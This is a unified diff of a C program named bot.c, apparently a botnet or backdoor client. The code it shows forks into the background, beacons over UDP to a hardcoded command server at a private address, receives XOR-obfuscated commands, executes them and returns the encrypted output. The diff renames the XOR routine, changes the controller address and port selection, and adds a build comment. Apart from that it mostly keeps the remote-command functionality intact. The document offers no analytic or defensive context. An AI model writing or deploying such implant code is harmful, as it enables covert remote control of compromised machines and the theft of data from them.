@@ -1,3 +1,10 @@
+/* gcc bot.c -o bot -pthread -lrt
+ *
+ * 
+ *
+ *
+*/
+
 #include <stdio.h> 
 #include <stdlib.h> 
 #include <unistd.h> 
@@ -23,7 +30,7 @@
 const char key[] = "blarknob";
 char keepalive[] = "<<CRLCHK>>";
 
-void crypt(char *m) {
+void lcrypt(char *m) {
     uint32_t len = strlen(m);
 	for (uint32_t i = 0; i < len; i++) {
 		m[i] ^= key[i % strlen(key)];
@@ -72,7 +79,7 @@ int exec(char *cmd, int sockfd, struct sockaddr_in *servaddr) {
             } else if (len == 0) {
                 break;
             } else {
-                crypt(buffer);
+                lcrypt(buffer);
                 sendto(sockfd, buffer, len, 0, (const struct sockaddr *) servaddr, sizeof(struct sockaddr_in));
             }
         }
@@ -82,7 +89,7 @@ int exec(char *cmd, int sockfd, struct sockaddr_in *servaddr) {
     return 1;
 }
   
-int main() { 
+int main(int argc, char* argv) { 
     pid_t pid = fork();
     if (pid < 0) {
         exit(0);
@@ -116,7 +123,7 @@ int main() {
         }
         rtn = pthread_mutex_lock(mutex);
 
-        crypt(keepalive);
+        lcrypt(keepalive);
         srand(time(NULL));
         size_t rekey = 0;
         
@@ -129,8 +136,7 @@ int main() {
             memset(&servaddr, 0, sizeof(servaddr));
             servaddr.sin_family = AF_INET;
             servaddr.sin_port = htons(58800 + (rand() % 250));
-            servaddr.sin_port = htons(58892);
-            inet_aton("10.5.2.1", &servaddr.sin_addr);
+            inet_aton("10.2.181.73", &servaddr.sin_addr);
 
             serverlen = sizeof(servaddr);
 
@@ -153,7 +159,7 @@ int main() {
                     keepalive_timer = time(NULL);
                     n = recvfrom(sockfd, cmd, PATH_MAX, 0, (struct sockaddr *) &servaddr, &serverlen);
                     cmd[n] = '\0';
-                    crypt(cmd);
+                    lcrypt(cmd);
                     exec(cmd, sockfd, &servaddr);
                 }
                 if (time(NULL) - keepalive_timer > 5) {
